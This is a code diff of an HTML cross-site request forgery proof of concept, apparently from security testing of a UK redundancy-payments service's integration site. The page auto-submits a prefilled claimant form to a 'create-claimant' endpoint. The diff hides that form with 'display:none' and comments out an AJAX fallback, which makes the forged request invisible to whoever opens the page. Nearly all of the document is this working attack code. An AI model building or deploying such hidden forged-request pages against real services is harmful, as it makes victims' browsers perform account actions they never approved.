@@ -10,7 +10,7 @@
     </style>
 </head>
     <body>
-    <form method="post" action="https://paddle-int.redundancy-payments.org.uk/create-claimant" id="CSRF-FORM">
+    <form method="post" action="https://paddle-int.redundancy-payments.org.uk/create-claimant" id="CSRF-FORM" style="display:none;">
         <h1>Claimant Details</h1><p>
                 <label for="claim_reference">Claim Reference Number (starts LN)</label>
                 <input id="claim_reference" name="claim_reference" value="LN00235112" type="text"><br>
@@ -103,14 +103,14 @@
 			form = $('#CSRF-FORM')
 			form.submit();
 
-			$.ajax({
-				type: "POST",
-				url: form.attr('action'),
-				data: form.serialize()
-			})
-			.done(function( msg ) {
-				alert( "Data Saved: " + msg );
-			});
+			//$.ajax({
+			//	type: "POST",
+			//	url: form.attr('action'),
+			//	data: form.serialize()
+			//})
+			//.done(function( msg ) {
+			//	alert( "Data Saved: " + msg );
+			//});
 		});
 
     </script>
